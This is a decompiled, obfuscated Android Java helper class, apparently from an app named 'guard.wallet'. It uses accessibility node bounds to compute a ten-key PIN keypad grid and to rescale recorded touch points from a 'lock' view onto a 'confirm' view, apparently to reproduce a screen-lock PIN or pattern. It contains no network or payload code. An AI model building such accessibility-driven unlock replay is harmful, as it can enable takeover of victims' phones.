package com.guard.wallet.helper;

import android.graphics.Rect;
import android.os.Build.VERSION;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.entity.Point;
import com.guard.wallet.req.ScreenMetricsVO;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;

public abstract class a {
   public static Rect a(AccessibilityNodeInfoCompat var0) {
      AccessibilityNodeInfo var1 = (AccessibilityNodeInfo)var0.getInfo();
      Rect var2 = new Rect();
      if (VERSION.SDK_INT >= 34) {
         var1.getBoundsInWindow(var2);
      } else {
         var1.getBoundsInScreen(var2);
      }

      c(var2);
      return var2;
   }

   public static HashMap b(Rect var0) {
      HashMap var9 = new HashMap();
      int var5 = var0.height();
      float var1 = (float)var0.width() / 3.0F;
      float var2 = (float)var5 / 4.0F;

      for (int var14 = 0; var14 <= 9; var14++) {
         Rect var8;
         if (var14 == 0) {
            float var3 = (float)var0.left + var1;
            float var4 = var2 * 3.0F + (float)var0.top;
            var8 = new Rect((int)var3, (int)var4, (int)(var3 + var1), (int)(var4 + var2));
         } else {
            int var7 = var14 - 1;
            int var6 = var7 / 3;
            float var10 = (float)var0.top;
            var10 = (float)var6 * var2 + var10;
            float var12 = (float)var0.left;
            var12 = (float)(var7 % 3) * var1 + var12;
            var8 = new Rect((int)var12, (int)var10, (int)(var12 + var1), (int)(var10 + var2));
         }

         var9.put(var14, var8);
      }

      return var9;
   }

   public static void c(Rect var0) {
      ScreenMetricsVO var2 = com.guard.wallet.utils.e.e();
      if (var2.getWidth() > 0) {
         int var1 = var0.left;
         if (var1 > 0 && var1 >= var2.getWidth()) {
            var0.left = var0.left - var2.getWidth();
            var0.right = var0.right - var2.getWidth();
         }
      }
   }

   public static void d(LinkedList var0) {
      if (!var0.isEmpty()) {
         ListIterator var2 = var0.listIterator();
         Point var3 = null;

         while (var2.hasNext()) {
            Point var1 = (Point)var2.next();
            if (var1 != null && var1.getX() >= 0.0F && var1.getY() >= 0.0F) {
               if (var1.equals(var3)) {
                  var2.remove();
               }

               var3 = var1;
            } else {
               var2.remove();
            }
         }
      }
   }

   public static List e(LinkedList var0, Rect var1, Rect var2, Rect var3, Rect var4) {
      if (var2 != null && var1 != null && var4 != null && var3 != null) {
         a1.q.B("center");
         a1.q.B("center");
         if (!var0.isEmpty()) {
            LinkedList var14 = new LinkedList();
            ScreenMetricsVO var15 = com.guard.wallet.utils.e.e();
            int var6 = var2.bottom - var2.top;
            int var8 = var1.right - var1.left;
            int var9 = var1.bottom - var1.top;
            int var10 = Math.min(var9, var8);
            int var7 = 0;
            if (var9 < var6) {
               var6 -= var9;
            } else {
               var6 = 0;
            }

            if (var15.getWidth() > 0) {
               var8 = var15.getWidth() / 2;
            } else {
               var8 = var8 / 2 + var1.left;
            }

            var9 = var9 / 2 + var1.top;
            if ("center".equals("center")) {
               var6 = var9 + var6 / 2;
            } else if ("center".equals("bottom")) {
               var6 = var9 + var6;
            } else {
               StringBuilder var17 = new StringBuilder("lockCenterY：");
               var17.append(var9);
               Log.d("AccessibilityNodeInfoHelper", var17.toString());
               var6 = var9;
            }

            int var13 = var4.bottom - var4.top;
            var9 = var3.right - var3.left;
            int var12 = var3.bottom - var3.top;
            int var11 = Math.min(var12, var9);
            if (var12 < var13) {
               var7 = var13 - var12;
            }

            if (var15.getWidth() > 0) {
               var9 = var15.getWidth() / 2;
            } else {
               var9 /= 2;
               var9 = var3.left + var9;
            }

            label53: {
               var12 = var12 / 2 + var3.top;
               if ("center".equals("center")) {
                  var7 /= 2;
               } else if (!"center".equals("bottom")) {
                  StringBuilder var18 = new StringBuilder("confirmCenterY：");
                  var18.append(var12);
                  Log.d("AccessibilityNodeInfoHelper", var18.toString());
                  var7 = var12 - var7;
                  break label53;
               }

               var7 += var12;
            }

            float var5 = (float)var11 / (float)var10;

            for (Point var19 : var0) {
               Point var16 = new Point();
               var16.setX((var19.getX() - (float)var8) * var5 + (float)var9);
               var16.setY((var19.getY() - (float)var6) * var5 + (float)var7);
               var14.add(var16);
            }

            return var14;
         }
      }

      return var0;
   }
}
